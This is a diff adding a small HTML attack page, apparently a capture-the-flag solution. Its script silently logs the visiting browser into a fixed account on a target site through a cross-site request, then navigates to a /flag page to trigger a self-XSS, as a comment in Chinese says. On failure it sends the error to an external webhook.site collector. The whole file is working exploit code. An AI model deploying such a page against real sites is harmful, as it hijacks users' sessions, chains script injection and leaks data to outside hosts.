@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+async function performCSRFAndNavigate() {
+    try {
+        await fetch('http://web:11202/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'username=valder&password=12345678'  // ← 替換為您的固定憑證
+        });
+        location.href = 'http://web:11202/flag';  // 觸發 Self-XSS
+    } catch (error) {
+        fetch('https://webhook.site/2c4cfcf4-ea51-4319-8e4d-6a9fcca90649?error=' + encodeURIComponent(error.message));
+    }
+}
+performCSRFAndNavigate();
+</script>
+</body>
+</html>
